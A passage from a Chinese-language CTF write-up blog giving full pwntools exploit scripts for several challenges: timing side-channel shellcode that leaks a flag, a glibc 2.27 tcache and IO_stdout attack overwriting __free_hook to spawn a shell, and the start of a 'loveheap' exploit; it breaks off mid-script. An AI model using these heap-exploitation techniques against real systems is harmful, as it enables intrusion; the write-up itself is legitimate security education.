class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.send(asm(shellcraft.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x10015</span>, <span class="hljs-number">0x100</span>)))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/15/qpMYn9IEgTLd7Qx.png"></p><p><strong>侧信道爆破flag</strong></p><p>肯定是要先打开文件然后才能读内容，所以第一部分shellcode肯定是open系统调用</p><p><img src="https://i.loli.net/2021/10/15/UEatVAPLkCnGNOd.png"></p><p>那现在就是读呗，方便起见就把flag读到栈上好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">orw_payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, rax</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">mov rdx, 0x100</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/15/eXWc7iN9r1osQVU.png"></p><p><img src="https://i.loli.net/2021/10/15/pYr7zMVyWGh1eg9.png"></p><p>下面部分就是重点了，read的第二个参数是rsi也就是存放了flag的地址，<code>mov    al, byte ptr [rsi]</code>可以将flag的第一位放到al中，接着<code>cmp    al, 0x3f</code>，如果flag的值大于0x3f就让程序跳转到比较的代码块中，也就是形成了一个死循环，下图是gdb调试的实例。设定一个超时异常处理就可以捕捉到这种死循环，接着下一个判断的就拿(0x3f+1+127)//2去跟flag的值做判断，了解过数据结构的二分查找就很容易理解，不多赘述了。一分多钟flag就跑出来了。</p><p><img src="https://i.loli.net/2021/10/15/3rPce54pMw9DZ7Y.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">orw_payload += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">               mov rdi, rax</span><br><span class="hljs-string">               xor rax, rax</span><br><span class="hljs-string">               mov rsi, rsp</span><br><span class="hljs-string">               mov rdx, 0x100</span><br><span class="hljs-string">               syscall</span><br><span class="hljs-string">               loop:</span><br><span class="hljs-string">               mov al, [rsi + %d]</span><br><span class="hljs-string">               cmp al, %d</span><br><span class="hljs-string">               ja loop</span><br><span class="hljs-string">               mov [rax], rax</span><br><span class="hljs-string">               &#x27;&#x27;&#x27;</span> % (i, mid)<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>binary = <span class="hljs-string">&#x27;./chall&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>):<br>    l = <span class="hljs-number">0</span><br>    r = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> l &lt; r:<br>        mid = (l + r) &gt;&gt; <span class="hljs-number">1</span><br>        local = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>        <span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;106.14.120.231&#x27;</span>, <span class="hljs-number">24002</span>)<br>        <span class="hljs-comment"># gdb.attach(p)</span><br>        <br>        orw_payload = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>        orw_payload += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">               mov rdi, rax</span><br><span class="hljs-string">               xor rax, rax</span><br><span class="hljs-string">               mov rsi, rsp</span><br><span class="hljs-string">               mov rdx, 0x100</span><br><span class="hljs-string">               syscall</span><br><span class="hljs-string">               loop:</span><br><span class="hljs-string">               mov al, [rsi + %d]</span><br><span class="hljs-string">               cmp al, %d</span><br><span class="hljs-string">               ja loop</span><br><span class="hljs-string">               mov [rax], rax</span><br><span class="hljs-string">               &#x27;&#x27;&#x27;</span> % (i, mid)<br>        p.send(asm(shellcraft.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x10015</span>, <span class="hljs-number">0x100</span>)))<br>        p.send(asm(orw_payload))<br>        st = time.time()<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                cur = p.recv(timeout=<span class="hljs-number">0.05</span>)<br>                <span class="hljs-keyword">if</span> time.time() - st &gt; <span class="hljs-number">1</span>:<br>                    l = mid + <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> EOFError:<br>            r = mid<br>        p.close()<br>    flag += <span class="hljs-built_in">chr</span>(l)<br>    <span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure><h2 id="superchunk"><a href="#superchunk" class="headerlink" title="superchunk"></a>superchunk</h2><p>脸黑，爆了我半个多小时才出，侥幸一血</p><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序分析起来几乎没有任何压力，libc2.27的uaf，没有show（io_stdout来泄露libc），只能操作当前堆块（劫持tcache struct），和今年国赛的lonelywolf十分相似。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>先劫持tcache struct，没有show函数就没法泄露堆地址了，程序开了PIE，可以爆破4个比特，1/16的概率。</p><p>堆块布局如下，把chunk0-&gt;fd的低两位字节覆盖掉，2个字节就是4个16进制数，低3位是固定的，还有一个是随机的，需要爆破。</p><p><img src="https://i.loli.net/2021/10/15/oFVbaWzYnjuI4Uk.png"></p><p>拿到tcache的控制堆块就可以为所欲为了，随便改了，后续操作就是泄露libc，打free_hook。</p><p>当然堆风水也需要慢慢调，下面简述一下劫持后的操作</p><p>让tcache struct放进unsorted bin里进行切割，切割后会留下unsorted bin的地址，然后再edit低两位字节，因为io_stdout的低3个16进制是固定的，需要爆破一个16进制数，概率1/16，再把stdout申请下来改成<code>p64(0xfbad3887)+p64(0)*3 + p8(0)</code>就可以泄露libc了。再后面就tcache attack了。</p><h3 id="调试过程-1"><a href="#调试过程-1" class="headerlink" title="调试过程"></a>调试过程</h3><p>调试过程关闭本机的地址随机化，命令：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><p><strong>劫持tcache struct</strong></p><p>让tcache链表中有两个chunk，那么其中fd就会指向一个堆地址，这里我是用了double free。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/h9Lsqp61Ju8BWQK.png"></p><p>再把chunk0的fd改成指向tcache struct，这样就劫持成功了，申请两次就能控制它了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(p16(<span class="hljs-number">0x3010</span>))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/C2ocepUBVzX7K5k.png"></p><p><strong>libc泄露</strong></p><p>我们来逆向思考一下，没有show函数要泄露libc基本就是通过打io_stdout，要把它申请到那么它肯定得在bin里面，最常见的就是tcache bin和unsorted bin，unsorted bin是个双链表不好操作，但他的地址又是个libc中的地址，跟io_stdout十分接近。那么我们就可以构造一种情形，同样大小的一个chunk即在unsorted bin里又在tcache bin里，那么只要同样的操作把低两位字节改成io_stdout的地址是不是就把io_stdout链到tcache bin里了。</p><p>操作如下，接着劫持tcache_struct那部分，通过修改tcache_struct把0x250大小的tcache bin的数量改成6，那么再free tcache_struct，他就会进入tcache bin，并且对应的数量为7，再free一次它又进入了unsorted bin。即同一堆块即在tcache bin中又在unsorted bin中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x23</span> + <span class="hljs-string">&#x27;\x06&#x27;</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/jrY3GTwpm2fyk5S.png"></p><p>接着再切割一下，是不是就有很多unsorted bin的地址链到tcache bin里了，不过多解释，需要清楚tcache每部分的含义(不知道那你劫持它干啥)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#备胎</span><br>free()<br>add(<span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/SXbVv1HTeuYpgjm.png"></p><p>再申请一个chunk进行编辑，可以发现正好是改的0xc0的tcache bin的fd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span>)<br>edit(p16(<span class="hljs-number">0xe760</span>))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/OwiVyaFCpW5hm8t.png"></p><p>那把它申请下来不就好了，libc到手，美滋滋</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xb0</span>)<br>edit(p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ed8b0</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/YoyJiPw7hE563uW.png"></p><p>后面就简单了，把<strong>备胎</strong>堆块申请下来，接着改tcache_struct，把free_hook链上去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-string">&#x27;\x03&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x3f</span> + p64(free_hook))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/Uu8rkhSeKaxnD74.png"></p><p>最后就一把梭了，不放图了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p><strong>本地调试版</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>binary = <span class="hljs-string">&#x27;./superchunk&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;106.14.120.231&#x27;</span>, <span class="hljs-number">26744</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br>elf = ELF(binary)<br><span class="hljs-comment"># libc = elf.libc</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br><br>gdb.attach(p)<br>add(<span class="hljs-number">0x100</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br>edit(p16(<span class="hljs-number">0x3010</span>))<br>add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x23</span> + <span class="hljs-string">&#x27;\x06&#x27;</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br>add(<span class="hljs-number">0x80</span>)<br><br>free()<br><br>add(<span class="hljs-number">0x100</span>)<br>edit(p16(<span class="hljs-number">0xe760</span>))<br><br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0xb0</span>)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># gdb.attach(p)</span><br>edit(p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ed8b0</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><span class="hljs-comment"># pause()</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-string">&#x27;\x03&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x3f</span> + p64(free_hook))<br>add(<span class="hljs-number">0x10</span>)<br>edit(p64(system))<br>add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free()<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>远程爆破版</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./superchunk&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br><span class="hljs-comment"># gdb.attach(p)</span><br>add(<span class="hljs-number">0x100</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br>edit(p16(<span class="hljs-number">0x3010</span>))<br>add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x23</span> + <span class="hljs-string">&#x27;\x06&#x27;</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br>add(<span class="hljs-number">0x80</span>)<br><br>free()<br><br>add(<span class="hljs-number">0x100</span>)<br><br>edit(p16(<span class="hljs-number">0xe760</span>))<br><span class="hljs-comment"># free()</span><br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0xb0</span>)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># gdb.attach(p)</span><br>edit(p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ed8b0</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><span class="hljs-comment"># pause()</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-string">&#x27;\x03&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x3f</span> + p64(free_hook))<br>add(<span class="hljs-number">0x10</span>)<br>edit(p64(system))<br>add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free()<br>p.interactive()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            local = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> local:<br>            <span class="hljs-comment"># p = process(binary)</span><br>                p = process([binary],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>&#125;)<br>                libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br>                <span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>            <span class="hljs-keyword">else</span>:<br>                p = remote(<span class="hljs-string">&#x27;106.14.120.231&#x27;</span>, <span class="hljs-number">26118</span>)<br>                libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br>            exp()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            p.close()<br></code></pre></td></tr></table></figure><h2 id="loveheap"><a href="#loveheap" class="headerlink" title="loveheap"></a>loveheap</h2><p>由于是calloc，所以比赛时候的思路是tcache stashing unlink attack，改global_max_fast，然后打fastbin attack，改malloc_hook为one_gadget。one_gadget试遍了，realloc调栈也试了，没出，可太难受了。</p><p>不知道这题的正解是什么，先把我的exp放出来，如果有师傅看到，希望可以指点一下(WeChat ID is verf1sh)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./loveheap&#x27;</span><br>elf = ELF(binary)<br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>    p = process(binary)<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;106.14.120.231&#x27;</span>, <span class="hljs-number">25777</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;content:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span 